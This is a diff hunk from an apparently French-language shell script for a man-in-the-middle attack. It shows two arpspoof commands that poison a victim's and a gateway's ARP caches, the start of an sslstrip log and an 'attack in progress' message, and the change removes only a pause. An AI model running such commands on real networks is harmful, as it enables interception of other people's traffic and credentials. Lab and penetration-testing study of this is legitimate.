@@ -246,7 +246,6 @@ while [ $sortie -eq "0" ]
 						arpspoof -i $iface -t $passerelle $vict 2> /dev/null &
 						arpspoof -i $iface -t $vict $passerelle 2> /dev/null &
 						clear
-						sleep 2
 						echo "debut" > sslstrip.log
 						resume $vict $passerelle
 						echo "\033[0;32mL'attaque est en cours\033[0m"
